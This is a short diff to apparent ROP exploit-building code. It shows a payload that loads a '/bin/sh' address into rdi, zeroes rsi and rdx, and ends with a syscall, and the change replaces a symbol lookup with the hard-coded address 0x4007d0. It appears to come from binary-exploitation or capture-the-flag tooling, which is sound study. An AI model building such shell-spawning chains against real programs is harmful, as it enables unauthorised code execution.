@@ -33,7 +33,7 @@ class ROP:
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
-        payload += p64(self.e.sym["syscall"])
+        payload += p64(0x4007d0)
         
         return payload
     
